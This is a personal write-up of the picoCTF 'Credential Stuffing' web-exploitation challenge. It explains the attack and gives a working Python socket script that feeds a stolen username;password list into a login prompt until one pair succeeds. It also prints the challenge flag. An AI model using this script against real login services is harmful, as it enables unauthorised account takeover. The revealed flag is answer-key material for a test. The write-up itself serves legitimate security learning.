# PicoCTF Credential Stuffing (Medium) (Web Exploitation)
![Cred](/Images/CredentialStuffing%20CTF/cred_1.png)

## Description

Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts.

Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too.

## Write-Up

### 1. Initial reading and scouting of the CTF

Upon the first reading of the CTF the challenge is based on something called credential stuffing. Essentially what this means is that a hacker has access to various account credentials from a data leak from another site and uses it to test login the usernames and passwords another site lets say in this case a bank app to gain access.

Which is what I'm going to replicate. The description also gives us a text file which has all the stolen account credentials which we are going to test against the bank login page. When reading out the text file it outputs various account usernames and passwords with the username separated by a ';' followed by a password.

![Cred](/Images/CredentialStuffing%20CTF/cred_2.png)
![Cred](/Images/CredentialStuffing%20CTF/cred_2.2.png)

when starting the instance it shows me a netcat command line to run to connect to an SSH which has a custom interactive shell menu imitating a bank login portal. which isn't a typical web exploitation where we can make a python script to connect to a https and send request using credentials, instead we might have to use socket module to connect to the SSH.

![Cred](/Images/CredentialStuffing%20CTF/cred_2.1.png)

Next was to make a python script I decided to make it on my machine first using VS code since I don't like using nano on the command line to make it.

For our script what we need it to do is first, connect to the SSH Second, takes in out text file and make it read the username and password separately and loop it per line then finally use that as our inputs on the login automating the whole process instead of copy and pasting it one by one which is what credential stuffing is similar to how brute forcing works.

```
import socket
import time

H = [Host]

P = [Port]

with open('credentials.txt', "r", encoding="utf-8") as file:
    for line in file:
        line = line.strip()
        if not line or ';' not in line:
            ConnectionRefusedError

        user,passw = line.split(";",1)


        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)

        try:
            s.connect((H,P))

            time.sleep(0.1)
            s.recv(1024)


            s.sendall(f"{user}\n".encode())

            time.sleep(0.1)
            s.recv(1024)

            s.sendall(f"{passw}\n".encode())

            time.sleep(0.2)
            response = s.recv(4096).decode()

            if "Invalid" not in response and response:
                    print(f"[+] Success: {user}:{passw}")
                    print(response)
                    break
            else:
                print(f"[-] Failed: {user}")
                    
        except socket.timeout:
            print(f"[-] Timeout on {user}")
        finally:
            s.close()
```

So this is the script I was able to come up with it takes in the host and port where we will be sending all the credentials and connecting too. 

Next it reads 'r' the credential_dump text file and parses a list of the usernames and passwords and just to be sure the parsing can be read I made sure it uses the utf-8 encoding.

Finally, it tries every user and pass together if it returns a success it breaks and prints the output. Else it keeps running I added failure and timeout so I could debug if anything goes wrong.

The  time.sleep and s.recv is to give the server time to respond and clear messages rather than just firing all the credentials out.

![Cred](/Images/CredentialStuffing%20CTF/cred_3.png)

Next step is to copy the script made on VS code and paste it into a script made on the site terminal by doing nano (filename).py its important to have the .py extension so it knows its a python script.

Then finally we run it. Ran into some errors on the way but its nothing special just that I was missing the cred text file and its name was wrong so I just did a Wget on the web terminal and put it in the same folder as the script.

![Cred](/Images/CredentialStuffing%20CTF/cred_4.png)
![Cred](/Images/CredentialStuffing%20CTF/cred_5.png)

After waiting for about 2-3 minutes I was able to get a hit on a account which gave me the flag!

![Cred](/Images/CredentialStuffing%20CTF/cred_6.png)
![Cred](/Images/CredentialStuffing%20CTF/cred_7.png)
<small>Thanks Lyndy!</small>

## Flag 🚩
<details>
    <summary>Flag</summary>

    picoCTF{d0nt_r3u5e_cr3d3nt1als_f45dfe3}

</details>

## What I learned

A key take away from this CTF is to have different passwords for different accounts. It not only ensures safety but also minimizes the risk and damages attackers can cause as they can potentially break into multiple accounts which share the same password.

Skills Practiced:
-python scripting
-shell commands
-web exploitation
-shell exploitation


